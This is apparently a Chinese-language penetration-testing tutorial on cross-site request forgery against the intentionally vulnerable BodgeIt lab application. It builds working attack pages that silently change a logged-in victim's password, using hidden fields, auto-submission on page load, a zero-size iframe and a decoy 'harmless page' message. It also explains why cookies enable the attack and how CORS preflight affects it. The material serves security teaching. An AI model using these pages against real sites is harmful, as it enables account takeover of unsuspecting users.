在这个教程中，我们将从应用程序中获取所需的信息，以便知道攻击网站应该如何向脆弱的服务器发送有效的请求，然后我们将创建一个页面，模拟合法请求并欺骗用户在已认证状态下访问该页面。我们还将对基本的概念验证进行几次迭代，使其看起来更像一个现实中的攻击，受害者不会注意到它。

# 准备中

你需要一个有效的 BodgeIt 用户账户来进行这个教程。我们将使用`user@example.com`作为我们的受害者：

![](img/2ce59f95-cfd0-4804-844f-ac7858b4da06.png)

# 如何操作...

首先，我们需要分析我们想要强迫受害者执行的请求。为此，我们需要使用 Burp Suite 或其他在浏览器中配置的代理：

1.  以任何用户身份登录到 BodgeIt 并点击用户名进入个人资料页面。

1.  执行密码更改。我们来看一下代理中请求的样子：

![](img/63d1ffbb-3262-4f9d-a3df-2d49958d0819.png)

因此，它是一个 `POST` 请求，发送到 `http://192.168.56.11/bodgeit/password.jsp`，请求正文中仅包含密码及其确认信息。

1.  让我们尝试制作一个非常简单的 HTML 页面来复制这个请求。创建一个文件（我们将其命名为`csrf-change-password.html`），并将以下内容写入其中：

```
<html>
<body>
<form action="http://192.168.56.11/bodgeit/password.jsp" method="POST">
<input name="password1" value="csrfpassword">
<input name="password2" value="csrfpassword">
<input type="submit" value="submit">
</form>
</body>
</html>
```

1.  现在，在与我们已登录会话相同的浏览器中加载这个文件：

![](img/f5129a54-3664-4acf-9e4e-0729f69f8b2f.png)

1.  点击提交，你将被重定向到用户的个人资料页面。页面会告诉你密码已成功更新。

1.  尽管这证明了这一点，但外部网站（或者像本例中的本地 HTML 页面）仍然可以在应用程序上执行密码更改请求。用户仍然不太可能点击提交按钮。我们可以自动化这个过程并隐藏输入字段，使恶意内容保持隐藏。让我们基于之前的页面创建一个新页面，命名为`csrf-change-password-scripted.html`：

```
<html>
<script>
function submit_form()
{
 document.getElementById('form1').submit();
}
</script>
<body onload="submit_form()">
<h1>A completely harmless page</h1>
You can trust this page.
Nothing bad is going to happen to you or your BodgeIt account. 
<form id="form1" action="http://192.168.56.11/bodgeit/password.jsp" method="POST">
<input name="password1" value="csrfpassword1" type="hidden">
<input name="password2" value="csrfpassword1" type="hidden">
</form>
</body>
</html>
```

这次，表单有一个 ID 参数，并且页面中有一个脚本，当页面完全加载时会自动提交内容。

1.  如果我们在与 BodgeIt 会话已启动的相同浏览器中加载这个页面，它会自动发送请求，并且用户的个人资料页面会随之显示。在下图中，我们使用浏览器的调试器在请求发送之前设置了一个断点：

![](img/511c7c8a-3264-4620-8802-19488addcee5.png)

1.  从攻击者的角度来看，最后这次尝试看起来更好；我们只需要受害者加载页面，请求就会自动发送，但接着受害者会看到“Your password has been changed”消息，这肯定会引起警觉。

1.  我们可以通过让攻击页面在同一页面的不可见框架中加载响应来进一步改进该攻击页面。有很多方法可以做到这一点；一种快速而简单的方法是将框架的大小设置为 `0`。我们的文件将如下所示：

```
<html>
<script>
function submit_form()
{
 document.getElementById('form1').submit();
}
</script>
<body onload="submit_form()">
<h1>A completely harmless page</h1>
You can trust this page.
Nothing bad is going to happen to you or your BodgeIt account. 
<form id="form1" action="http://192.168.56.11/bodgeit/password.jsp" method="POST" target="target_frame">
<input name="password1" value="csrfpassword1" type="hidden">
<input name="password2" value="csrfpassword1" type="hidden">
</form>
<iframe name="target_frame" height="0%" witdht="0%">
</iframe>
</body>
</html>
```

请注意，表单的 target 属性是下面定义的 `iframe`，而且这个框架的 `height` 和 `width` 都是 `0%`。

1.  在启动会话的浏览器中加载新页面。此截图显示了使用浏览器的开发者工具检查页面时的外观：

![](img/a8964913-8631-43d1-a3ca-67a87d6c916f.png)

请注意，`iframe` 对象在页面中仅为一条黑线，在 `Inspector` 中，我们可以看到它包含了 BodgeIt 用户的个人资料页面。

1.  如果我们分析我们的 CSRF 页面所进行的网络通信，我们可以看到它实际上是在请求更改 BodgeIt 密码：

![](img/ec4821c6-e984-412f-8ae9-0d48fc724867.png)

# 它是如何工作的……

当我们从浏览器发送请求，并且已经存储了属于目标域的 cookie 时，浏览器会在请求发送之前自动将该 cookie 附加到请求中；这正是 cookie 作为会话标识符如此方便的原因，但 HTTP 的这种工作方式也是使其容易受到像我们在本例中看到的攻击的原因。

当我们在同一个浏览器中加载一个页面，而该浏览器中已经有一个活动的应用程序会话，即使是不同的标签页或窗口，并且该页面向会话发起的域发起请求时，浏览器会自动将会话 cookie 附加到该请求中。如果服务器没有验证其接收到的请求是否确实来源于应用程序内部，通常是通过添加一个包含唯一令牌的参数，该令牌在每个请求或每次情况下都会变化，它就允许恶意网站代表合法的、已认证的用户发起请求，而这些用户在登录目标域时访问了这个恶意网站。

在 web 应用程序渗透测试中，我们使用的第一个代码，包含两个文本字段和提交按钮，可能足以证明存在安全漏洞。然而，如果应用程序的渗透测试是其他工作的一部分，比如社会工程学或红队演习，则需要一些额外的努力，以防止受害用户怀疑发生了什么。在这个过程中，我们使用 JavaScript 来自动发送请求，通过在页面中设置 `onload` 事件，并在事件处理函数中执行表单的提交方法。我们还使用了一个隐藏的 `iframe` 来加载密码更改的响应，这样，受害者就永远看不到密码已更改的消息。

# 另见

应用程序通常使用 web 服务执行某些任务或从服务器检索信息，而无需更改或重新加载页面；这些请求是通过 JavaScript 发出的（它们会添加请求头 `X-Requested-With: XMLHttpRequest`），通常采用 JSON 或 XML 格式，并带有 `Content-Type` 头，其值为 `application/json` 或 `application/xml`。当发生这种情况并且我们尝试进行跨站点/域请求时，浏览器将执行所谓的 **预检请求**，这意味着在预定请求之前，浏览器会发送一个 `OPTIONS` 请求来验证服务器允许从跨源（与应用程序所在域不同的域）请求哪些方法和内容类型。

预检请求可以中断 CSRF 攻击，因为如果服务器不允许跨域请求，浏览器就不会发送恶意请求。然而，这种保护仅在通过脚本发起请求时有效，而在通过表单发起请求时则无效。因此，如果我们能够将 JSON 或 XML 请求转换为普通的 HTML 表单，我们就可以发起 CSRF 攻击。如果无法做到这一点，例如因为服务器只允许某些特定的内容类型，那么我们成功发起 CSRF 攻击的唯一机会就是服务器的 **跨源资源共享**（**CORS**）策略允许来自我们攻击域的请求，因此需要检查服务器响应中的 `Access-Control-Allow-Origin` 头。
